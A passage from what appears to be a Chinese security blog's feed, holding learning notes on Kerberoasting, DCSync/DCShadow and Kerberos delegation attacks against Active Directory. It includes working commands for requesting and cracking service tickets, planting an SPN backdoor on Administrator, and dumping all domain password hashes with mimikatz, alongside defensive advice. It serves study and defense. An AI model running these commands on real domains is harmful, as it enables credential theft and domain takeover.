target="_blank" rel="noopener">https://github.com/EmpireProject/Empire/commit/6ee7e036607a62b0192daed46d3711afc65c3921</a></p><p>使用<code>System.IdentityModel.Tokens.KerberosRequestorSecurityToken</code>请求TGS，在返回结果中提取出TGS，输出的TGS可选择John the Ripper或Hashcat进行破解</p><p>实例演示：</p><p>在域内一台主机上以普通用户权限执行：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Kerberoast -AdminCount -OutputFormat Hashcat <span class="string">| fl</span></span><br></pre></td></tr></table></figure><p>-AdminCount表示选择高权限的用户</p><p>输出结果如下图</p><p><img src="2-2.png" alt="Alt text"></p><p>只提取出hash的参数如下：</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | <span class="type">Select</span> hash | <span class="type">ConvertTo</span>-CSV -NoTypeInformation</span><br></pre></td></tr></table></figure><p>输出结果如下图</p><p><img src="2-3.png" alt="Alt text"></p><p>使用hashcat破解的参数如下：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 13100 <span class="string">/tmp/hash.txt</span> <span class="string">/tmp/password.list</span> -o found.txt <span class="params">--force</span></span><br></pre></td></tr></table></figure><p>破解结果如下图，成功获得明文口令<code>MySQLAdmin111!</code></p><p><img src="2-4.png" alt="Alt text"></p><p><strong>注：</strong></p><p>Rubeus也可以实现Invoke-Kerberoast的功能，地址如下：</p><p><a href="https://github.com/GhostPack/Rubeus" target="_blank" rel="noopener">https://github.com/GhostPack/Rubeus</a></p><p>参数如下：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">Rubeus</span>.</span></span>exe kerberoast</span><br></pre></td></tr></table></figure><h2 id="0x06-Kerberoasting的后门利用"><a href="#0x06-Kerberoasting的后门利用" class="headerlink" title="0x06 Kerberoasting的后门利用"></a>0x06 Kerberoasting的后门利用</h2><hr><p>在我们取得了SPN的修改权限后，可以为指定的域用户添加一个SPN，这样可以随时获得该域用户的TGS，经过破解后获得明文口令</p><p>例如为域用户<code>Administrator</code>添加<code>SPNVNC/DC1.test.com</code>，参数如下：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn<span class="selector-class">.exe</span> -U -A VNC/DC1<span class="selector-class">.test</span><span class="selector-class">.com</span> Administrator</span><br></pre></td></tr></table></figure><p>如下图</p><p><img src="3-1.png" alt="Alt text"></p><p>在域内任意一台主机都能获得该SPN，并且能够使用Kerberoast获得TGS，如下图</p><p><img src="3-2.png" alt="Alt text"></p><p>再使用hashcat破解即可</p><p><strong>补充：</strong></p><p>删除SPN的参数如下：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn<span class="selector-class">.exe</span> -D VNC/DC1<span class="selector-class">.test</span><span class="selector-class">.com</span> Administrator</span><br></pre></td></tr></table></figure><h2 id="0x07-防御"><a href="#0x07-防御" class="headerlink" title="0x07 防御"></a>0x07 防御</h2><hr><p>Kerberoasting攻击的主要前提是口令复杂度较低、 加密算法强度较弱</p><p>对抗Kerberoasting攻击也需从这2方面开展:</p><ul><li>提高服务账号的口令复杂度；</li><li>尽量将域内的服务器系统升级至少至Windows 2008 系统，应用AES256高难度的加密算法.</li></ul><p>管理员可在域内一台主机上使用Invoke-Kerberoast检查是否存在危险的SPN</p><p>下载地址：</p><p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a></p><p>参数：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Get</span>-NetUser -spn -AdminCount|<span class="keyword">Select</span> <span class="type">name</span>,whencreated,pwdlastset,lastlogon</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;kerberosating攻击学习&quot;&gt;&lt;a href=&quot;#kerberosating攻击学习&quot; class=&quot;headerlink&quot; title=&quot;kerberosating攻击学习&quot;&gt;&lt;/a&gt;kerberosating攻击学习&lt;/h2&gt;&lt;h4 id=&quot;前言&quot;&gt;&lt;
      
    
    </summary>
    
    
      <category term="内网与域渗透学习" scheme="https://shu1l.github.io/categories/%E5%86%85%E7%BD%91%E4%B8%8E%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>DCSync与DCshadow攻击学习</title>
    <link href="https://shu1l.github.io/2020/08/05/dcsync-yu-dcshadow-gong-ji-xue-xi/"/>
    <id>https://shu1l.github.io/2020/08/05/dcsync-yu-dcshadow-gong-ji-xue-xi/</id>
    <published>2020-08-05T09:03:28.000Z</published>
    <updated>2020-11-25T09:10:57.289Z</updated>
    
    <content type="html"><![CDATA[<h2 id="DCSync与DCshadow攻击学习"><a href="#DCSync与DCshadow攻击学习" class="headerlink" title="DCSync与DCshadow攻击学习"></a>DCSync与DCshadow攻击学习</h2><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>DCSync与DCshadow是域渗透中经常会用到的技术。</p><h3 id="DCSync-攻击"><a href="#DCSync-攻击" class="headerlink" title="DCSync 攻击"></a>DCSync 攻击</h3><p>​    2015 年 8 月，Benjamin Delpy(神器 Mimikatz 的作者)和 Vincent Le Toux 发布了新版本的 Mimikatz，新增加了 DCSync 功能。模仿一个域控制器 DC，从真实的域控制器中请求获取数据，例如账号的口令散列值等数据。</p><p>​    DCSync 之前，获取域的账号口令信息，需要登录域服务器，在域服务器上运行代码才可以获取。</p><p>​    DCSync 的最大特点，在于不用登录域服务器，即可远程通过<strong>域数据同步复制</strong>的方式获得想要的用户口令信息。</p><p>​    需要注意的是，DCSync 攻击的对象如果是 RODC 域控制器，则会失效，因为 RODC是不能参与复制同步数据</p><h4 id="DCSync攻击原理"><a href="#DCSync攻击原理" class="headerlink" title="DCSync攻击原理"></a>DCSync攻击原理</h4><p>DCSync 的原理非常清晰，利用<strong>域控制器之间的数据同步复制</strong>。</p><ul><li>发现网络中的目标域控制器;</li><li>通过 DRS 服务的 GetNCChanges 接口发起数据同步请求，Directory Replication Service (DRS) Remote Protocol</li></ul><p>Samba wiki 关于 GetNCChanges 的描述包括:</p><p>​    当一个 DC (客户端 DC)想从其他 DC (服务端 DC)获取数据时，客户端 DC 会向服务端 DC 发起一个 GetNCChanges 请求。回应的数据包括需要同步的数据。</p><p>如果需要同步的数据比较多，则会重复上述过程。毕竟每次回应的数据有限。</p><h5 id="实现代码"><a href="#实现代码" class="headerlink" title="实现代码"></a>实现代码</h5><p><a href="https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/lsadump/kuhl_m_lsadump_dc.c#L27" target="_blank" rel="noopener">https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/lsadump/kuhl_m_lsadump_dc.c#L27</a></p><h4 id="DCSync攻击前提"><a href="#DCSync攻击前提" class="headerlink" title="DCSync攻击前提"></a>DCSync攻击前提</h4><p>一个用户想发起 DCSync 攻击，必须获得以下任一用户的权限：</p><ul><li>Administrators组内的用户</li><li>Domain Admins组内的用户</li><li>Enterprise Admins组内的用户</li><li>域控制器的计算机帐户</li></ul><p>即：默认情况下域管理员组具有该权限。</p><p><img src="20200507093022.png-water_print" alt="img"></p><p><img src="20200507093039.png-water_print" alt="img"></p><h4 id="DCSync攻击利用"><a href="#DCSync攻击利用" class="headerlink" title="DCSync攻击利用"></a>DCSync攻击利用</h4><h5 id="1-使用mimikatz"><a href="#1-使用mimikatz" class="headerlink" title="1.使用mimikatz"></a>1.使用mimikatz</h5><p>导出域内所有用户的hash：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">"lsadump::dcsync /domain:test.com /all /csv"</span> <span class="keyword">exit</span></span><br></pre></td></tr></table></figure><p><img src="20200507093111.png-water_print" alt="img"></p><p>导出域内administrator帐户的hash：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">"lsadump::dcsync /domain:test.com /user:administrator /csv"</span> <span class="keyword">exit</span></span><br></pre></td></tr></table></figure><h5 id="2-powershell实现"><a href="#2-powershell实现" class="headerlink" title="2.powershell实现"></a>2.powershell实现</h5><p><a href="https://gist.github.com/monoxgas/9d238accd969550136db" target="_blank" rel="noopener">https://gist.github.com/monoxgas/9d238accd969550136db</a></p><p>通过Invoke-ReflectivePEinjection调用mimikatz.dll中的dcsync功能</p><p>导出域内所有用户的hash：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-DCSync -DumpForest <span class="string">| ft -wrap -autosize</span></span><br></pre></td></tr></table></figure><p>导出域内administrator帐户的hash：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-DCSync -DumpForest -Users @(<span class="string">"administrator"</span>) | ft -<span class="keyword">wrap</span> -<span class="keyword">a</span></span><br></pre></td></tr></table></figure><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">lsadump:</span>:dcsync <span class="regexp">/domain:rd.adsecurity.org /</span><span class="string">user:</span>Administrator</span><br></pre></td></tr></table></figure><h4 id="DCSync防御"><a href="#DCSync防御" class="headerlink" title="DCSync防御"></a>DCSync防御</h4><p>DCSync 攻击的原理是模拟域控制器发起服务器之间的数据同步复制。</p><p>最好的防御方法是给域控制器设置白名单。在域内，域控制器的数量、IP地址、MAC 地址是非常明确清晰的资产，将这些资产设置在允许同步的白名单内。非白名单的 IP 不允许发生数据同步</p><p>获取域内所有IP的脚本:</p><p>powershell</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PowerShell:<span class="built_in">Get-ADDomainController</span> <span class="literal">-filter</span> * | select IPv4Address</span><br><span class="line">或</span><br><span class="line">[<span class="type">System.DirectoryServices.ActiveDirectory.Domain</span>]::GetCurrentDomain().DomainControllers | select IPAddress</span><br></pre></td></tr></table></figure><p>在网络设备上检测来自白名单以外的域控制器数据同步复制</p><h3 id="DCShadow-攻击"><a href="#DCShadow-攻击" class="headerlink" title="DCShadow 攻击"></a>DCShadow 攻击</h3><p>2018年1月24日，Benjamin Delpy(神器 Mimikatz 的作者)和 Vincent Le Toux 在 BlueHat IL 会议期间公布了针对域活动目录的一种新型攻击技术 <code>DCShadow</code></p><p>在<strong>具备域管理员权限条件</strong>下，攻击者可以<strong>创建伪造的域控制器</strong>，将预先设定的对象或对象属性复制到正在运行域服务器中。</p><p>DCSync 从域服务器复制出东西，DCShadow 是将数据复制至域服务器。</p><p>Luc Delsalle 对这种技术进行了验证和详细的描述，并就红蓝对抗中蓝队对抗此种攻击技术的缺陷和补救方法。</p><p>从 DCShadow 目前展示的功能来看，主要只能用于红蓝对抗的隐蔽后门。但是 DCShadow 第一次澄清和实现了伪造一个 DC 的最小需求合集，这个贡献非常大。以 前很多攻击方法都卡在不能伪造域服务器，例如 MS15-011 和 MS15-014 等，有了 <code>DCShadow</code> 的基础，相信将来会有很多新的攻击方法。</p><h4 id="DCShadow-攻击流程"><a href="#DCShadow-攻击流程" class="headerlink" title="DCShadow 攻击流程"></a>DCShadow 攻击流程</h4><p>根据 Luc Delsalle 的描述，DCShadow 的攻击过程包括 3 个主要个步骤:</p><p>1、在目标域的 AD 活动目录注册一个伪造的 DC 中;</p><p>2、使伪造的 DC 被其他的 DC 认可，能够参与域复制 ;</p><p>3、强制触发域复制，将指定的新对象或修改后的对象属性同步复制到其他 DC 中;</p><h4 id="注册伪造的DC"><a href="#注册伪造的DC" class="headerlink" title="注册伪造的DC"></a>注册伪造的DC</h4><p>一台机器要想注册成为域中的一台 DC 服务器，需要在域的活动目录中注册一个 <code>NTDS-DSA(nTDSDSA)</code>类对象。注册的位置为 <code>CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=adsec,DC=com</code></p><p><img src="20200507100302.png-water_print" alt="img"></p><p>adsec.com 域有 3 台域服务器，分别是 LABDC01、RESDC01 及 WIN2016-DC01，标红的正是我们实验环境的域服务器。我们测试的机器为 Win7X86cn04，测试成功的则会生成一个新的NTDS-DSA(nTDSDSA)类对象</p><p><img src="20200507100638.png-water_print" alt="img"></p><p>查看 <code>CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=adsec,DC=com</code>的安全描述符，可知必须有<code>域管理员权限</code>才具备<code>写</code>权限</p><p>所以发动 DCShadow 攻击首先必须具备域管理员权限，但是我们可以通实验，做点手脚，就会好办一些，例如将完全权限赋予普通用户，则普通用户也可以修改</p><p><img src="20200507100807.png-water_print" alt="img"></p><p><img src="20200507100835.png-water_print" alt="img"></p><p>DC Shadow 源码：</p><p><img src="20200507100956.png-water_print" alt="img"></p><h4 id="注册的DC被其他DC认可，能够参与域复制"><a href="#注册的DC被其他DC认可，能够参与域复制" class="headerlink" title="注册的DC被其他DC认可，能够参与域复制"></a>注册的DC被其他DC认可，能够参与域复制</h4><p>一个刚注册的 DC 要想被域中其他DC认可，能够参与域复制，需要满足 3 个条件:</p><ul><li>这台伪造 DC 具备认证凭证，能认证到域，即有域内账号，可以使用机器账号，实验环境中为 <code>WIN7X86CN04$</code>;</li><li>伪造 DC 能认证其他 DC 来访问的账号，如果我们给 <code>WIN7X86CN04$</code> 添加 <code>SPN</code>，则可以实现这一点。关键是需要添加哪些SPN，DCShadow 的一个大贡献是找到 了 SPN 的最小合集，只需要 2 个即可:<code>DRS</code>服务(GUID 为 E3514235–4B06–11D1-AB04–00C04FC2DCD2) 和 <code>GS</code>(Global Catalog)服务</li></ul><p><img src="20200507101146.png-water_print" alt="img"></p><ul><li>运行DRS服务，最少需要实现 IDL_DRSBind、IDL_DRSUnbind、IDL_DRSGetNCChanges、IDL_DRSUpdateRefs 这 4 个 RPC 接口，以便其他 DC 能够通过 RPC 获取需要复制的数据。Mimikatz 工具的最新版已经集成了这 4 个接口</li></ul><h4 id="强制立即发起域复制"><a href="#强制立即发起域复制" class="headerlink" title="强制立即发起域复制"></a>强制立即发起域复制</h4><p>​    通常负责域复制和同步的进程是 KCC 进程，默认时间是 15 分钟校验一次，如果需要复制则发起;也可以使用 Windows 域服务器自带的系统工具 repadmin，该工具会调用 DRSReplicaAdd 函数接口强制立即发起域复制，DCShadow 正是通过调用 DRSReplicaAdd 函数强制立即发起域复制</p><p><img src="20200507101534.png-water_print" alt="img"></p><h4 id="攻击复现"><a href="#攻击复现" class="headerlink" title="攻击复现"></a>攻击复现</h4><p>查看 <code>CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=adsec,DC=com</code> 的安全描述符，可知必须有域管理员权限才具备写权限</p><p>所以发动 <code>DCShadow</code> 攻击首先必须具备域管理员权限，但是我们可以通实验，做点手脚，就会好办一些，例如将完全权限赋予普通用户，则普通用户也可以修改</p><p><img src="20200507101621.png-water_print" alt="img"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;DCSync与DCshadow攻击学习&quot;&gt;&lt;a href=&quot;#DCSync与DCshadow攻击学习&quot; class=&quot;headerlink&quot; title=&quot;DCSync与DCshadow攻击学习&quot;&gt;&lt;/a&gt;DCSync与DCshadow攻击学习&lt;/h2&gt;&lt;h4 i
      
    
    </summary>
    
    
      <category term="内网与域渗透学习" scheme="https://shu1l.github.io/categories/%E5%86%85%E7%BD%91%E4%B8%8E%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="域渗透" scheme="https://shu1l.github.io/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>kerberos域委派攻击学习</title>
    <link href="https://shu1l.github.io/2020/08/05/kerberos-yu-wei-pai-gong-ji-xue-xi/"/>
    <id>https://shu1l.github.io/2020/08/05/kerberos-yu-wei-pai-gong-ji-xue-xi/</id>
    <published>2020-08-05T09:02:51.000Z</published>
    <updated>2020-11-25T09:14:23.903Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Kerberos委派攻击学习"><a href="#Kerberos委派攻击学习" class="headerlink" title="Kerberos委派攻击学习"></a>Kerberos委派攻击学习</h2><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>​    域委派是大型网络中经常部署的应用模式，给多跳认证带来很大的便利，同时也带来很大的安全隐患，利用 委派可获取域管理员权限，甚至制作深度隐藏的后门域委派是指将域内用户的权限委派给服务账号，使得服务账号能以用户权限开展域内活动。</p><h4 id="域委派的基本过程"><a href="#域委派的基本过程" class="headerlink" title="域委派的基本过程"></a>域委派的基本过程</h4><p>​    委派（Delegation）是kerberos相对于NTLM认证独有的特性，指的是A可以让B<strong>“代理”</strong>自己去访问C服务，说是代理，也可以理解为<strong>“假冒”</strong>。</p><p>​    具体为：域中A使用Kerberos身份验证访问域中的服务B，而B再利用A的身份去请求域中的服务C，因为用的是A的身份，所以只有A有权限访问C的时候，委派才能成功。</p><p><img src="20200505104626.png-water_print" alt="img"></p><p>​        一个域内普通用户jack通过Kerberos协议认证到前台WEB服务后，前台运行WEB服务的<strong>服务账号websvc</strong>模拟（ Impersonate）用户jack，以Kerberos协议继续认证到后台服务器，从而在后台服务器中获取jack用户的访问权限，即域中跳或者多跳的Kerberos认证。</p><ul><li>域内用户jack以Kerberos方式认证后访问Web服务器；</li><li>Web服务以websvc服务账号运行，websvc向KDC发起jack用户的票据申请。</li><li>KDC检查websvc用户的委派属性，如果被设置， 则返回jack用户的可转发票据TGT；</li><li>websvc收到jack用户TGT后，使用该票据向KDC 申请访问文件服务器的服务票据TGS；</li><li>KDC检查websvc的委派属性，如果被设置，且申请的文件服务在允许的列表清单中，则返回一个jack用户 访问文件服务的授权票据TGS；</li><li>websvc收到的jack用户的授权票据TGS后，可访问文件服务，完成多跳认证。</li></ul><h4 id="委派分类"><a href="#委派分类" class="headerlink" title="委派分类"></a>委派分类</h4><h5 id="非约束性委派"><a href="#非约束性委派" class="headerlink" title="非约束性委派"></a>非约束性委派</h5><p>​    非约束性委派(Unconstrained Delegation)，服务账号可以获取某用户的 TGT，从而服务账号可使用该 TGT，模拟用户<strong>访问任意服务</strong></p><p>​    如果某个服务 A 的服务账号 B 被设置为非约束委派，当用户 C 通过 Kerberos 认证访问服务 A 时，KDC 会检查服务账号 B 的属性，发现是非约束性委派时，KDC 会将用户 C 的 TGT 放在 TGS 中，这样 B 在验证 TGS 的同时获取了 A 用户的 TGT，从而可以模拟用户 A 访问<code>任意</code>服务</p><p><img src="WX20200414-123835@2x.png" alt="img"></p><ol><li>用户向KDC请求可转发TGT，记为TGT1</li><li>KDC返回TGT1</li><li>用户通过TGT1向KDC请求转发TGT2</li><li>KDC返回TGT2</li><li>用户通过TGT1向KDC申请访问服务1的RST</li><li>KDC返回RST</li><li>用户发送RST、TGT1、TGT2和TGT2的SessionKey给服务1</li><li>服务1通过用户的TGT2请求KDC，以用户名义请求服务2的RST（服务访问票据）</li><li>KDC给服务1返回服务2的RST</li><li>服务1以用户名义向服务2发出请求</li><li>服务2响应服务1的请求</li><li>服务1响应用户第7步骤的请求</li></ol><p>这个流程有一个问题：<strong>TGT2是不被限制的，服务1完全可以用它来请求访问任何想访问的服务。</strong>攻击其实就是利用的这点，使用从高权限账户处得到的TGT去获取权限。</p><h5 id="约束性委派"><a href="#约束性委派" class="headerlink" title="约束性委派"></a>约束性委派</h5><p>因为非约束委派很不安全，所以微软又发布了约束委派，区别在于不会直接把TGT给服务，所发送的认证信息中包含了允许访问的服务，即不允许服务代表用户去访问其他服务。</p><p>其实现主要依靠一组kerberos扩展：<code>S4U2Self</code>（Service for User to Self）和<code>S4U2Proxy</code>（Service for User to Proxy）</p><p><img src="WX20200414-123923@2x.png" alt="img"></p><p>流程如下：</p><ol><li>用户向服务1发出请求</li><li>在此之前服务1已经得到了用户访问服务1的TGT，接下来通过S4U2self扩展模拟用户向KDC请求ST</li><li>KDC返回给服务1一个用于验证服务1的ST</li><li>服务1使用第三步的ST响应用户的请求</li><li>用户再次向服务1发起请求，委派服务1访问服务2，条件是服务1验证通过且有有效的TGT，以及服务1有用户到服务1的可转发ST，即ST1</li><li>服务1通过S4U2Proxy扩展请求KDC返回一个用于验证服务2的ST，即ST2</li><li>KDC在验证PAC的数字签名后,如果没有失败（成功或没有PAC），将返回ST2给服务1</li><li>服务1代表用户使用ST2请求服务2，服务2判断此用户是否经过KDC验证，依据为ST2中的cname和crealm标识</li><li>服务2响应服务1的请求</li><li>服务1响应用户请求</li></ol><p><img src="20200505111706.png-water_print" alt="img"></p><h4 id="查找具有委派属性的服务账号"><a href="#查找具有委派属性的服务账号" class="headerlink" title="查找具有委派属性的服务账号"></a>查找具有委派属性的服务账号</h4><h5 id="非约束委派的查找"><a href="#非约束委派的查找" class="headerlink" title="非约束委派的查找"></a>非约束委派的查找</h5><h6 id="ldapsearch"><a href="#ldapsearch" class="headerlink" title="ldapsearch"></a>ldapsearch</h6><blockquote><p>kali上自带，适合在域外查询</p></blockquote><p>这个参数过多就不一一列举了，需要查阅的<code>ldapsearch -h</code>即可</p><p>查找域中配置非约束委派的用户：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ldapsearch</span> -x -H ldap://192.168.141.145:389 -D <span class="string">"CN=qiyou,CN=Users,DC=qiyou,DC=com"</span> -w password -b <span class="string">"DC=qiyou,DC=com"</span> <span class="string">"(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))"</span> |grep -iE <span class="string">"distinguishedName"</span></span><br></pre></td></tr></table></figure><p>过滤条件</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&amp;(samAccountType=<span class="number">805306368</span>)(userAccountControl:<span class="number">1.2</span><span class="number">.840</span><span class="number">.113556</span><span class="number">.1</span><span class="number">.4</span><span class="number">.803</span>:=<span class="number">524288</span>))</span><br></pre></td></tr></table></figure><p><img src="20200206165316-1da1e568-48be-1.png" alt="img"></p><p>查找域中配置非约束委派的主机：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ldapsearch</span> -x -H ldap://192.168.141.145:389 -D <span class="string">"CN=qiyou,CN=Users,DC=qiyou,DC=com"</span> -w password -b <span class="string">"DC=qiyou,DC=com"</span> <span class="string">"(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))"</span> |grep -iE <span class="string">"distinguishedName"</span></span><br></pre></td></tr></table></figure><p><strong>注</strong>：域控主机账户默认开启非约束委派</p><p>过滤条件</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&amp;(samAccountType=<span class="number">805306369</span>)(userAccountControl:<span class="number">1.2</span><span class="number">.840</span><span class="number">.113556</span><span class="number">.1</span><span class="number">.4</span><span class="number">.803</span>:=<span class="number">524288</span>))</span><br></pre></td></tr></table></figure><p><strong>注</strong>：更多LDAP的过滤语法请参考微软的手册：<a href="https://social.technet.microsoft.com/wiki/contents/articles/5392.active-directory-ldap-syntax-filters.aspx?Sort=MostUseful" target="_blank" rel="noopener">地址</a></p><p><img src="20200206163923-2d25d118-48bc-1.png" alt="img"></p><p><strong>注</strong>：区别服务用户和主机的区别是<code>samAccountType=805306368 (0x30000000)</code>时为用户，<code>samAccountType=805306369 (0x30000001)</code>时为主机</p><h6 id="ADFind"><a href="#ADFind" class="headerlink" title="ADFind"></a>ADFind</h6><p>使用参数</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">AdFind</span> [<span class="keyword">switches] </span>[-<span class="keyword">b </span><span class="keyword">basedn] </span>[-f filter] [<span class="meta">attr</span> list]</span><br></pre></td></tr></table></figure><p>参数说明：</p><ul><li>-b：指定要查询的根节点</li><li>-f：LDAP过滤条件</li><li>attr list：需要显示的属性</li></ul><p>查找域中配置非约束委派的用户：</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">AdFind.exe</span> -<span class="keyword">b </span><span class="string">"DC=qiyou,DC=com"</span> -f <span class="string">"(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))"</span> <span class="meta">cn</span> distinguishedName</span><br></pre></td></tr></table></figure><p><img src="20200211171505-fdc6fd1a-4cae-1.png" alt="img"></p><p>查找域中配置非约束委派的主机：</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">AdFind.exe</span> -<span class="keyword">b </span><span class="string">"DC=qiyou,DC=com"</span> -f <span class="string">"(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))"</span> <span class="meta">cn</span> distinguishedName</span><br></pre></td></tr></table></figure><p><img src="20200211171701-43418342-4caf-1.png" alt="img"></p><h6 id="PowerView"><a href="#PowerView" class="headerlink" title="PowerView"></a>PowerView</h6><p>查找域中配置非约束委派用户</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Get</span>-NetUser -Unconstrained -<span class="keyword">Domain</span> qiyou.com |<span class="keyword">select</span> <span class="type">name</span></span><br></pre></td></tr></table></figure><p><img src="20200205215906-acc0ea0e-481f-1.png" alt="img"></p><p>查找域中配置非约束委派的主机：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Get</span>-NetComputer -Unconstrained -<span class="keyword">Domain</span> qiyou.com</span><br></pre></td></tr></table></figure><p><img src="20200205220057-ee88c01a-481f-1.png" alt="img"></p><p>查询域中配置非约束委派的主机（另外一个版本的powerview）：</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Get</span>-DomainComputer -Unconstrained -<span class="keyword">Properties</span> distinguishedname,useraccountcontrol -<span class="keyword">Verbose</span> | ft -Wrap -AutoSize</span><br></pre></td></tr></table></figure><p><img src="20200205220213-1bd856d4-4820-1.png" alt="img"></p><h5 id="约束委派的查找"><a href="#约束委派的查找" class="headerlink" title="约束委派的查找"></a>约束委派的查找</h5><h6 id="ldapsearch-1"><a href="#ldapsearch-1" class="headerlink" title="ldapsearch"></a>ldapsearch</h6><p>查找域中配置约束委派用户</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ldapsearch</span> -x -H ldap://192.168.141.145:389 -D <span class="string">"CN=qiyou,CN=Users,DC=qiyou,DC=com"</span> -w password -b <span class="string">"DC=qiyou,DC=com"</span> <span class="string">"(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))"</span> |grep -iE <span class="string">"distinguishedName|allowedtodelegateto"</span></span><br></pre></td></tr></table></figure><p>过滤条件</p><figure class="highlight hy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="name"><span class="builtin-name">&amp;</span></span>(<span class="name">samAccountType=805306368</span>)(<span class="name">msds-allowedtodelegateto=*</span>))</span><br></pre></td></tr></table></figure><p><img src="20200206165805-c9d9c512-48be-1.png" alt="img"></p><p>查找域中配置约束委派的主机：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ldapsearch</span> -x -H ldap://192.168.141.145:389 -D <span class="string">"CN=qiyou,CN=Users,DC=qiyou,DC=com"</span> -w password -b <span class="string">"DC=qiyou,DC=com"</span> <span class="string">"(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))"</span> |grep -iE <span class="string">"distinguishedName|allowedtodelegateto"</span></span><br></pre></td></tr></table></figure><p>过滤条件</p><figure class="highlight hy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="name"><span class="builtin-name">&amp;</span></span>(<span class="name">samAccountType=805306369</span>)(<span class="name">msds-allowedtodelegateto=*</span>))</span><br></pre></td></tr></table></figure><p><img src="20200206164433-e5901240-48bc-1.png" alt="img"></p><h6 id="ADFind-1"><a href="#ADFind-1" class="headerlink" title="ADFind"></a>ADFind</h6><p>查找域中配置约束委派用户</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">AdFind.exe</span> -<span class="keyword">b </span><span class="string">"DC=qiyou,DC=com"</span> -f <span class="string">"(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))"</span> <span class="meta">cn</span> distinguishedName msds-allowedtodelegateto</span><br></pre></td></tr></table></figure><p><img 